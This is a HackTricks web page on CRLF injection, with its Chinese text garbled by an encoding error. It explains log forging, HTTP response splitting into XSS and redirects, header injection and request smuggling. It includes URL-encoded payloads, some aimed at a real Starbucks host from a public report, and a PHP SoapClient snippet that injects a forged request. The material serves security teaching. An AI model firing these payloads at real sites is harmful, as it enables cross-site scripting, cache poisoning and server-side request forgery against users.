<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>CRLF (%0D%0A) Injection</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="crlf-0d0a-æ³¨å…¥"><a class="header" href="#crlf-0d0a-æ³¨å…¥">CRLF (%0D%0A) æ³¨å…¥</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<figure><img src="../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
<p><strong>æ¼æ´èµé‡‘æç¤º</strong>ï¼š<strong>æ³¨å†Œ</strong> <strong>Intigriti</strong>ï¼Œä¸€ä¸ªç”±é»‘å®¢ä¸ºé»‘å®¢åˆ›å»ºçš„é«˜çº§ <strong>æ¼æ´èµé‡‘å¹³å°</strong>ï¼ä»Šå¤©å°±åŠ å…¥æˆ‘ä»¬ <a href="https://go.intigriti.com/hacktricks"><strong>https://go.intigriti.com/hacktricks</strong></a>ï¼Œå¼€å§‹èµšå–é«˜è¾¾ <strong>$100,000</strong> çš„èµé‡‘ï¼</p>
<p>{% embed url="https://go.intigriti.com/hacktricks" %}</p>
<h3 id="crlf"><a class="header" href="#crlf">CRLF</a></h3>
<p>å›è½¦ (CR) å’Œæ¢è¡Œ (LF)ï¼Œç»Ÿç§°ä¸º CRLFï¼Œæ˜¯åœ¨ HTTP åè®®ä¸­ç”¨äºè¡¨ç¤ºè¡Œç»“æŸæˆ–æ–°è¡Œå¼€å§‹çš„ç‰¹æ®Šå­—ç¬¦åºåˆ—ã€‚Web æœåŠ¡å™¨å’Œæµè§ˆå™¨ä½¿ç”¨ CRLF æ¥åŒºåˆ† HTTP å¤´éƒ¨å’Œå“åº”ä½“ã€‚è¿™äº›å­—ç¬¦åœ¨å„ç§ Web æœåŠ¡å™¨ç±»å‹ï¼ˆå¦‚ Apache å’Œ Microsoft IISï¼‰ä¸­æ™®éç”¨äº HTTP/1.1 é€šä¿¡ã€‚</p>
<h3 id="crlf-æ³¨å…¥æ¼æ´"><a class="header" href="#crlf-æ³¨å…¥æ¼æ´">CRLF æ³¨å…¥æ¼æ´</a></h3>
<p>CRLF æ³¨å…¥æ¶‰åŠå°† CR å’Œ LF å­—ç¬¦æ’å…¥ç”¨æˆ·æä¾›çš„è¾“å…¥ä¸­ã€‚è¿™ä¸€è¡Œä¸ºè¯¯å¯¼æœåŠ¡å™¨ã€åº”ç”¨ç¨‹åºæˆ–ç”¨æˆ·å°†æ³¨å…¥çš„åºåˆ—è§£é‡Šä¸ºä¸€ä¸ªå“åº”çš„ç»“æŸå’Œå¦ä¸€ä¸ªå“åº”çš„å¼€å§‹ã€‚è™½ç„¶è¿™äº›å­—ç¬¦æœ¬èº«å¹¶ä¸å…·å®³ï¼Œä½†å…¶è¯¯ç”¨å¯èƒ½å¯¼è‡´ HTTP å“åº”åˆ†å‰²å’Œå…¶ä»–æ¶æ„æ´»åŠ¨ã€‚</p>
<h3 id="ç¤ºä¾‹æ—¥å¿—æ–‡ä»¶ä¸­çš„-crlf-æ³¨å…¥"><a class="header" href="#ç¤ºä¾‹æ—¥å¿—æ–‡ä»¶ä¸­çš„-crlf-æ³¨å…¥">ç¤ºä¾‹ï¼šæ—¥å¿—æ–‡ä»¶ä¸­çš„ CRLF æ³¨å…¥</a></h3>
<p><a href="https://www.invicti.com/blog/web-security/crlf-http-header/">ç¤ºä¾‹æ¥è‡ªè¿™é‡Œ</a></p>
<p>è€ƒè™‘ä¸€ä¸ªç®¡ç†å‘˜é¢æ¿ä¸­çš„æ—¥å¿—æ–‡ä»¶ï¼Œå…¶æ ¼å¼ä¸ºï¼š<code>IP - æ—¶é—´ - è®¿é—®è·¯å¾„</code>ã€‚ä¸€ä¸ªå…¸å‹çš„æ¡ç›®å¯èƒ½çœ‹èµ·æ¥åƒï¼š</p>
<pre><code>123.123.123.123 - 08:15 - /index.php?page=home
</code></pre>
<p>æ”»å‡»è€…å¯ä»¥åˆ©ç”¨CRLFæ³¨å…¥æ¥æ“çºµæ­¤æ—¥å¿—ã€‚é€šè¿‡åœ¨HTTPè¯·æ±‚ä¸­æ³¨å…¥CRLFå­—ç¬¦ï¼Œæ”»å‡»è€…å¯ä»¥æ”¹å˜è¾“å‡ºæµå¹¶ä¼ªé€ æ—¥å¿—æ¡ç›®ã€‚ä¾‹å¦‚ï¼Œæ³¨å…¥çš„åºåˆ—å¯èƒ½ä¼šå°†æ—¥å¿—æ¡ç›®è½¬æ¢ä¸ºï¼š</p>
<pre><code>/index.php?page=home&amp;%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&amp;restrictedaction=edit
</code></pre>
<p>è¿™é‡Œï¼Œ<code>%0d</code> å’Œ <code>%0a</code> ä»£è¡¨ CR å’Œ LF çš„ URL ç¼–ç å½¢å¼ã€‚æ”»å‡»åï¼Œæ—¥å¿—ä¼šè¯¯å¯¼æ€§åœ°æ˜¾ç¤ºï¼š</p>
<pre><code>IP - Time - Visited Path

123.123.123.123 - 08:15 - /index.php?page=home&amp;
127.0.0.1 - 08:15 - /index.php?page=home&amp;restrictedaction=edit
</code></pre>
<p>æ”»å‡»è€…é€šè¿‡ä½¿å…¶æ¶æ„æ´»åŠ¨çœ‹èµ·æ¥åƒæ˜¯æœ¬åœ°ä¸»æœºï¼ˆåœ¨æœåŠ¡å™¨ç¯å¢ƒä¸­é€šå¸¸è¢«ä¿¡ä»»çš„å®ä½“ï¼‰æ‰§è¡Œçš„æ“ä½œï¼Œä»è€Œæ©ç›–å…¶æ´»åŠ¨ã€‚æœåŠ¡å™¨å°†ä»¥ <code>%0d%0a</code> å¼€å¤´çš„æŸ¥è¯¢éƒ¨åˆ†è§£é‡Šä¸ºå•ä¸ªå‚æ•°ï¼Œè€Œ <code>restrictedaction</code> å‚æ•°åˆ™è¢«è§£æä¸ºå¦ä¸€ä¸ªç‹¬ç«‹çš„è¾“å…¥ã€‚è¢«æ“æ§çš„æŸ¥è¯¢æœ‰æ•ˆåœ°æ¨¡æ‹Ÿäº†ä¸€ä¸ªåˆæ³•çš„ç®¡ç†å‘½ä»¤ï¼š<code>/index.php?page=home&amp;restrictedaction=edit</code></p>
<h3 id="http-å“åº”æ‹†åˆ†"><a class="header" href="#http-å“åº”æ‹†åˆ†">HTTP å“åº”æ‹†åˆ†</a></h3>
<h4 id="æè¿°"><a class="header" href="#æè¿°">æè¿°</a></h4>
<p>HTTP å“åº”æ‹†åˆ†æ˜¯ä¸€ç§å®‰å…¨æ¼æ´ï¼Œå‘ç”Ÿåœ¨æ”»å‡»è€…åˆ©ç”¨ HTTP å“åº”çš„ç»“æ„æ—¶ã€‚è¯¥ç»“æ„ä½¿ç”¨ç‰¹å®šå­—ç¬¦åºåˆ—å°†å¤´éƒ¨ä¸ä¸»ä½“åˆ†å¼€ï¼Œå³å›è½¦ï¼ˆCRï¼‰åè·Ÿæ¢è¡Œï¼ˆLFï¼‰ï¼Œç»Ÿç§°ä¸º CRLFã€‚å¦‚æœæ”»å‡»è€…è®¾æ³•åœ¨å“åº”å¤´ä¸­æ’å…¥ CRLF åºåˆ—ï¼Œä»–ä»¬å¯ä»¥æœ‰æ•ˆåœ°æ“æ§åç»­çš„å“åº”å†…å®¹ã€‚è¿™ç§æ“æ§å¯èƒ½å¯¼è‡´ä¸¥é‡çš„å®‰å…¨é—®é¢˜ï¼Œç‰¹åˆ«æ˜¯è·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰ã€‚</p>
<h4 id="é€šè¿‡-http-å“åº”æ‹†åˆ†è¿›è¡Œ-xss"><a class="header" href="#é€šè¿‡-http-å“åº”æ‹†åˆ†è¿›è¡Œ-xss">é€šè¿‡ HTTP å“åº”æ‹†åˆ†è¿›è¡Œ XSS</a></h4>
<ol>
<li>åº”ç”¨ç¨‹åºè®¾ç½®ä¸€ä¸ªè‡ªå®šä¹‰å¤´ï¼Œå¦‚ï¼š<code>X-Custom-Header: UserInput</code></li>
<li>åº”ç”¨ç¨‹åºä»æŸ¥è¯¢å‚æ•°ä¸­è·å– <code>UserInput</code> çš„å€¼ï¼Œæ¯”å¦‚ "user_input"ã€‚åœ¨ç¼ºä¹é€‚å½“è¾“å…¥éªŒè¯å’Œç¼–ç çš„æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ ä¸€ä¸ªåŒ…å« CRLF åºåˆ—åŠæ¶æ„å†…å®¹çš„æœ‰æ•ˆè½½è·ã€‚</li>
<li>æ”»å‡»è€…æ„é€ ä¸€ä¸ªå¸¦æœ‰ç‰¹æ®Šæ„é€ çš„ 'user_input' çš„ URLï¼š<code>?user_input=Value%0d%0a%0d%0a&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
</ol>
<ul>
<li>åœ¨è¿™ä¸ª URL ä¸­ï¼Œ<code>%0d%0a%0d%0a</code> æ˜¯ CRLFCRLF çš„ URL ç¼–ç å½¢å¼ã€‚å®ƒæ¬ºéª—æœåŠ¡å™¨æ’å…¥ CRLF åºåˆ—ï¼Œä½¿æœåŠ¡å™¨å°†åç»­éƒ¨åˆ†è§†ä¸ºå“åº”ä¸»ä½“ã€‚</li>
</ul>
<ol start="4">
<li>æœåŠ¡å™¨åœ¨å“åº”å¤´ä¸­åæ˜ æ”»å‡»è€…çš„è¾“å…¥ï¼Œå¯¼è‡´æ„å¤–çš„å“åº”ç»“æ„ï¼Œå…¶ä¸­æ¶æ„è„šæœ¬è¢«æµè§ˆå™¨è§£é‡Šä¸ºå“åº”ä¸»ä½“çš„ä¸€éƒ¨åˆ†ã€‚</li>
</ol>
<h4 id="http-å“åº”æ‹†åˆ†å¯¼è‡´é‡å®šå‘çš„ç¤ºä¾‹"><a class="header" href="#http-å“åº”æ‹†åˆ†å¯¼è‡´é‡å®šå‘çš„ç¤ºä¾‹">HTTP å“åº”æ‹†åˆ†å¯¼è‡´é‡å®šå‘çš„ç¤ºä¾‹</a></h4>
<p>æ¥è‡ª <a href="https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62">https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62</a></p>
<p>æµè§ˆå™¨åˆ°ï¼š</p>
<pre><code>/%0d%0aLocation:%20http://myweb.com
</code></pre>
<p>è€ŒæœåŠ¡å™¨å“åº”çš„å¤´éƒ¨æ˜¯ï¼š</p>
<pre><code>Location: http://myweb.com
</code></pre>
<p><strong>å…¶ä»–ç¤ºä¾‹ï¼šï¼ˆæ¥è‡ª</strong> <a href="https://www.acunetix.com/websitesecurity/crlf-injection/"><strong>https://www.acunetix.com/websitesecurity/crlf-injection/</strong></a><strong>)</strong></p>
<pre><code>http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
</code></pre>
<h4 id="åœ¨-url-è·¯å¾„ä¸­"><a class="header" href="#åœ¨-url-è·¯å¾„ä¸­">åœ¨ URL è·¯å¾„ä¸­</a></h4>
<p>æ‚¨å¯ä»¥å°†æœ‰æ•ˆè´Ÿè½½<strong>æ”¾åœ¨ URL è·¯å¾„ä¸­</strong>ä»¥æ§åˆ¶æ¥è‡ªæœåŠ¡å™¨çš„<strong>å“åº”</strong>ï¼ˆç¤ºä¾‹æ¥è‡ª<a href="https://hackerone.com/reports/192667">è¿™é‡Œ</a>):</p>
<pre><code>http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
</code></pre>
<p>Check more examples in:</p>
<p>{% embed url="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md" %}</p>
<h3 id="http-header-injection"><a class="header" href="#http-header-injection">HTTP Header Injection</a></h3>
<p>HTTP Header Injectionï¼Œé€šå¸¸é€šè¿‡ CRLFï¼ˆå›è½¦å’Œæ¢è¡Œï¼‰æ³¨å…¥è¿›è¡Œåˆ©ç”¨ï¼Œå…è®¸æ”»å‡»è€…æ’å…¥ HTTP å¤´ã€‚è¿™å¯èƒ½ä¼šç ´åå®‰å…¨æœºåˆ¶ï¼Œä¾‹å¦‚ XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰è¿‡æ»¤å™¨æˆ– SOPï¼ˆåŒæºç­–ç•¥ï¼‰ï¼Œå¯èƒ½å¯¼è‡´å¯¹æ•æ„Ÿæ•°æ®ï¼ˆå¦‚ CSRF ä»¤ç‰Œï¼‰çš„æœªç»æˆæƒè®¿é—®ï¼Œæˆ–é€šè¿‡æ¤å…¥ cookie æ“çºµç”¨æˆ·ä¼šè¯ã€‚</p>
<h4 id="exploiting-cors-via-http-header-injection"><a class="header" href="#exploiting-cors-via-http-header-injection">Exploiting CORS via HTTP Header Injection</a></h4>
<p>æ”»å‡»è€…å¯ä»¥æ³¨å…¥ HTTP å¤´ä»¥å¯ç”¨ CORSï¼ˆè·¨æºèµ„æºå…±äº«ï¼‰ï¼Œç»•è¿‡ SOP æ–½åŠ çš„é™åˆ¶ã€‚è¿™ä¸€æ¼æ´å…è®¸æ¥è‡ªæ¶æ„æ¥æºçš„è„šæœ¬ä¸æ¥è‡ªä¸åŒæ¥æºçš„èµ„æºè¿›è¡Œäº¤äº’ï¼Œå¯èƒ½è®¿é—®å—ä¿æŠ¤çš„æ•°æ®ã€‚</p>
<h4 id="ssrf-and-http-request-injection-via-crlf"><a class="header" href="#ssrf-and-http-request-injection-via-crlf">SSRF and HTTP Request Injection via CRLF</a></h4>
<p>CRLF æ³¨å…¥å¯ä»¥ç”¨äºæ„é€ å’Œæ³¨å…¥ä¸€ä¸ªå…¨æ–°çš„ HTTP è¯·æ±‚ã€‚ä¸€ä¸ªæ˜¾è‘—çš„ä¾‹å­æ˜¯ PHP çš„ <code>SoapClient</code> ç±»ä¸­çš„æ¼æ´ï¼Œç‰¹åˆ«æ˜¯åœ¨ <code>user_agent</code> å‚æ•°å†…ã€‚é€šè¿‡æ“çºµæ­¤å‚æ•°ï¼Œæ”»å‡»è€…å¯ä»¥æ’å…¥é¢å¤–çš„å¤´å’Œä¸»ä½“å†…å®¹ï¼Œç”šè‡³å®Œå…¨æ³¨å…¥ä¸€ä¸ªæ–°çš„ HTTP è¯·æ±‚ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªæ¼”ç¤ºæ­¤åˆ©ç”¨çš„ PHP ç¤ºä¾‹ï¼š</p>
<pre><code class="language-php">$target = 'http://127.0.0.1:9090/test';
$post_string = 'variable=post value';
$crlf = array(
'POST /proxy HTTP/1.1',
'Host: local.host.htb',
'Cookie: PHPSESSID=[PHPSESSID]',
'Content-Type: application/x-www-form-urlencoded',
'Content-Length: '.(string)strlen($post_string),
"\r\n",
$post_string
);

$client = new SoapClient(null,
array(
'uri'=&gt;$target,
'location'=&gt;$target,
'user_agent'=&gt;"IGN\r\n\r\n".join("\r\n",$crlf)
)
);

# Put a netcat listener on port 9090
$client-&gt;__soapCall("test", []);
</code></pre>
<h3 id="header-injection-to-request-smuggling"><a class="header" href="#header-injection-to-request-smuggling">Header Injection to Request Smuggling</a></h3>
<p>æœ‰å…³æ­¤æŠ€æœ¯å’Œæ½œåœ¨é—®é¢˜çš„æ›´å¤šä¿¡æ¯ <a href="https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning"><strong>è¯·æŸ¥çœ‹åŸå§‹æ¥æº</strong></a>ã€‚</p>
<p>æ‚¨å¯ä»¥æ³¨å…¥å¿…è¦çš„å¤´éƒ¨ï¼Œä»¥ç¡®ä¿ <strong>åç«¯åœ¨å“åº”åˆå§‹è¯·æ±‚åä¿æŒè¿æ¥æ‰“å¼€</strong>ï¼š</p>
<pre><code>GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
</code></pre>
<p>åœ¨æ­¤ä¹‹åï¼Œå¯ä»¥æŒ‡å®šç¬¬äºŒä¸ªè¯·æ±‚ã€‚æ­¤åœºæ™¯é€šå¸¸æ¶‰åŠ<a href="http-request-smuggling/">HTTP request smuggling</a>ï¼Œè¿™æ˜¯ä¸€ç§æŠ€æœ¯ï¼Œå…¶ä¸­æœåŠ¡å™¨åœ¨æ³¨å…¥åé™„åŠ çš„é¢å¤–å¤´éƒ¨æˆ–ä¸»ä½“å…ƒç´ å¯èƒ½å¯¼è‡´å„ç§å®‰å…¨æ¼æ´ã€‚</p>
<p><strong>åˆ©ç”¨ï¼š</strong></p>
<ol>
<li><strong>æ¶æ„å‰ç¼€æ³¨å…¥</strong>ï¼šæ­¤æ–¹æ³•æ¶‰åŠé€šè¿‡æŒ‡å®šæ¶æ„å‰ç¼€æ¥æ¯’å®³ä¸‹ä¸€ä¸ªç”¨æˆ·çš„è¯·æ±‚æˆ–ç½‘ç»œç¼“å­˜ã€‚ä¸€ä¸ªä¾‹å­æ˜¯ï¼š</li>
</ol>
<p><code>GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1</code></p>
<ol start="2">
<li><strong>ä¸ºå“åº”é˜Ÿåˆ—æ¯’å®³æ„é€ å‰ç¼€</strong>ï¼šæ­¤æ–¹æ³•æ¶‰åŠåˆ›å»ºä¸€ä¸ªå‰ç¼€ï¼Œå½“ä¸å°¾éƒ¨åƒåœ¾ç»“åˆæ—¶ï¼Œå½¢æˆä¸€ä¸ªå®Œæ•´çš„ç¬¬äºŒä¸ªè¯·æ±‚ã€‚è¿™å¯ä»¥è§¦å‘å“åº”é˜Ÿåˆ—æ¯’å®³ã€‚ä¸€ä¸ªä¾‹å­æ˜¯ï¼š</li>
</ol>
<p><code>GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1</code></p>
<h3 id="memcache-æ³¨å…¥"><a class="header" href="#memcache-æ³¨å…¥">Memcache æ³¨å…¥</a></h3>
<p>Memcache æ˜¯ä¸€ä¸ª<strong>ä½¿ç”¨æ˜æ–‡åè®®çš„é”®å€¼å­˜å‚¨</strong>ã€‚æ›´å¤šä¿¡æ¯è¯·å‚è§ï¼š</p>
<p>{% content-ref url="../network-services-pentesting/11211-memcache/" %}
<a href="../network-services-pentesting/11211-memcache/">11211-memcache</a>
{% endcontent-ref %}</p>
<p><strong>æœ‰å…³å®Œæ•´ä¿¡æ¯ï¼Œè¯·é˜…è¯»</strong><a href="https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/"> <strong>åŸå§‹æŠ¥å‘Š</strong></a></p>
<p>å¦‚æœä¸€ä¸ªå¹³å°ä»<strong>HTTPè¯·æ±‚ä¸­è·å–æ•°æ®å¹¶åœ¨æœªæ¸…ç†çš„æƒ…å†µä¸‹ä½¿ç”¨å®ƒ</strong>æ¥å‘<strong>memcache</strong>æœåŠ¡å™¨æ‰§è¡Œ<strong>è¯·æ±‚</strong>ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šåˆ©ç”¨è¿™ç§è¡Œä¸º<strong>æ³¨å…¥æ–°çš„ memcache å‘½ä»¤</strong>ã€‚</p>
<p>ä¾‹å¦‚ï¼Œåœ¨æœ€åˆå‘ç°çš„æ¼æ´ä¸­ï¼Œç¼“å­˜é”®ç”¨äºè¿”å›ç”¨æˆ·åº”è¿æ¥çš„ IP å’Œç«¯å£ï¼Œæ”»å‡»è€…èƒ½å¤Ÿ<strong>æ³¨å…¥ memcache å‘½ä»¤</strong>ï¼Œè¿™å°†<strong>æ¯’å®³</strong>ç¼“å­˜ä»¥å°†å—å®³è€…çš„è¯¦ç»†ä¿¡æ¯ï¼ˆåŒ…æ‹¬ç”¨æˆ·åå’Œå¯†ç ï¼‰å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼š</p>
<figure><img src="../.gitbook/assets/image (659).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/ba72cd16-2ca0-447b-aa70-5cde302a0b88/body-578d9f9f-1977-4e34-841c-ad870492328f_10.png?w=1322&#x26;h=178&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>
<p>æ­¤å¤–ï¼Œç ”ç©¶äººå‘˜è¿˜å‘ç°ï¼Œä»–ä»¬å¯ä»¥ä½¿ memcache å“åº”ä¸åŒæ­¥ï¼Œä»¥å°†æ”»å‡»è€…çš„ IP å’Œç«¯å£å‘é€ç»™æ”»å‡»è€…ä¸çŸ¥é“å…¶ç”µå­é‚®ä»¶çš„ç”¨æˆ·ï¼š</p>
<figure><img src="../.gitbook/assets/image (637).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/c6c1f3c4-d244-4bd9-93f7-2c88f139acfa/body-3f9ceeb9-3d6b-4867-a23f-e0e50a46a2e9_14.png?w=1322&#x26;h=506&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>
<h3 id="å¦‚ä½•é˜²æ­¢-web-åº”ç”¨ç¨‹åºä¸­çš„-crlf--http-å¤´æ³¨å…¥"><a class="header" href="#å¦‚ä½•é˜²æ­¢-web-åº”ç”¨ç¨‹åºä¸­çš„-crlf--http-å¤´æ³¨å…¥">å¦‚ä½•é˜²æ­¢ Web åº”ç”¨ç¨‹åºä¸­çš„ CRLF / HTTP å¤´æ³¨å…¥</a></h3>
<p>ä¸ºäº†å‡è½» Web åº”ç”¨ç¨‹åºä¸­ CRLFï¼ˆå›è½¦å’Œæ¢è¡Œï¼‰æˆ– HTTP å¤´æ³¨å…¥çš„é£é™©ï¼Œå»ºè®®é‡‡å–ä»¥ä¸‹ç­–ç•¥ï¼š</p>
<ol>
<li><strong>é¿å…åœ¨å“åº”å¤´ä¸­ç›´æ¥ä½¿ç”¨ç”¨æˆ·è¾“å…¥</strong>ï¼šæœ€å®‰å…¨çš„æ–¹æ³•æ˜¯é¿å…å°†ç”¨æˆ·æä¾›çš„è¾“å…¥ç›´æ¥çº³å…¥å“åº”å¤´ä¸­ã€‚</li>
